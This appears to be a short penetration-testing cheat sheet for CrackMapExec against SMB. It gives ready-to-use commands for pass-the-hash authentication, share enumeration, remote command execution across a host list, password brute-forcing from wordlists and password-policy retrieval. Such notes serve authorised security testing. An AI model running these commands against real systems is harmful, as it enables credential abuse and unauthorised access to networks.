# Crackmapexec

## SMB

```csharp
crackmapexec smb <TARGET_IP> -d <DOMAIN> -u Administrator -H <NTLM HASH>
```

### Shares enumeration

```csharp
crackmapexec smb 10.110.0.222  -u 'CROOK\homer_potter' -p $PASS --shares
```

### Executing a command on a provided hosts list

```csharp
crackmapexec smb <HOST.lst> -d domain.com -u Administrator -H <NTLM HASH> -x 'whoami'
```

### Bruteforce attack

```csharp
crackmapexec smb <TARGET_IP> -u <user.lst> -p <pass.list>
```

### Password policy

```csharp
crackmapexec smb 10.110.0.222 --pass-pol -u '' -p ''
```

## Resource

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

